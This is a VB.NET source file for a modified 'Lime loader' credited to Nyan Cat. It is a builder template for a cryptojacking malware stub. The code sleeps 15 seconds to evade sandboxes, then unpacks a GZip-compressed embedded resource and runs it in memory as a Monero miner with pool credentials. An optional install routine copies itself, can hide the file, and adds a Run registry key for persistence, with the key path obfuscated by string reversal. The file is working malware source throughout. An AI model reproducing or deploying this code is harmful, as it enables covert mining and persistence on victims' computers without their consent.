
'------------------------------------------
'An Modified Lime loader | Nyan Cat 8/27/2018
'
'https://github.com/NYAN-x-CAT/Lime-Loader
'------------------------------------------

Imports System.IO
Imports System
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Windows.Forms
Imports System.Threading


'%ASSEMBLY%<Assembly: AssemblyTitle("%Title%")> 
'%ASSEMBLY%<Assembly: AssemblyDescription("%Description%")> 
'%ASSEMBLY%<Assembly: AssemblyCompany("%Company%")> 
'%ASSEMBLY%<Assembly: AssemblyProduct("%Product%")> 
'%ASSEMBLY%<Assembly: AssemblyCopyright("%Copyright%")> 
'%ASSEMBLY%<Assembly: AssemblyTrademark("%Trademark%")> 
'%ASSEMBLY%<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")> 

Public Class Main_

    Public Shared Sub Main()
        If Sleeping() Then
            '%install  Drop_._Install()
            RunPE_._Run(Resources_.LoadFile("IMG1"))
        End If
    End Sub

    Private Shared Function Sleeping() As Boolean
        Dim Count As Integer = 0
        Do Until Count = 15
            Thread.Sleep(1000)
            Count += 1
        Loop
        Return True
    End Function
End Class

'%installPublic Class Drop_
'%install Public Shared Sub _Install()
'%install  Try
'%install If PayloadPath <> Application.ExecutablePath Then
'%install IO.File.Copy(Application.ExecutablePath, PayloadPath, True)
'%install '%Hidden IO.File.SetAttributes(PayloadPath, IO.FileAttributes.System + IO.FileAttributes.Hidden)
'%install Microsoft.Win32.Registry.CurrentUser.CreateSubKey(Microsoft.VisualBasic.Strings.StrReverse("\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS")).SetValue("Payload.exe", PayloadPath)
'%install Diagnostics.Process.Start(PayloadPath)
'%install Environment.Exit(0)
'%install End If
'%install Catch : End Try
'%install End Sub
'%install End Class

Public Class Resources_
    Public Shared Function LoadFile(ByVal Get_ As String) As Byte()
        Dim MyAssembly As Assembly = Assembly.GetExecutingAssembly()
        Dim MyResource As New Resources.ResourceManager("ParentRes", MyAssembly)
        Return Compression_.GZip_(MyResource.GetObject(Get_))
    End Function
End Class

Public Class RunPE_
    Public Shared Sub _Run(ByVal DLL_ As Byte())
        'Dim CPU As String = "txtCPU", URL As String = "txtURL", PWD As String = "txtPWD", USER As String = "txtUSER"
        'Dim ActiveCPU As String = "ActiveCPU", ActiveThread As String = "ActiveThread"
        'Dim IdleCPU As String = "IdleCPU", IdleThread As String = "IdleThread"


        'Recommended to ignore all settings above and use settings that matches user's PC
        Assembly.Load(DLL_).GetType("XMR.Main").GetMethod("XM", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {InjectionMethod, "URL_", "USER_", "PWD_"})
    End Sub
End Class

Public Class Compression_
    Public Shared Function GZip_(ByVal B As Byte()) As Byte()
        Dim MS As New IO.MemoryStream(B)
        Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Decompress)
        Dim buffer As Byte() = New Byte(4 - 1) {}
        MS.Position = (MS.Length - 5)
        MS.Read(buffer, 0, 4)
        Dim count As Integer = BitConverter.ToInt32(buffer, 0)
        MS.Position = 0
        Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
        Ziped.Read(array, 0, count)
        Ziped.Dispose()
        MS.Dispose()
        Return array
    End Function
End Class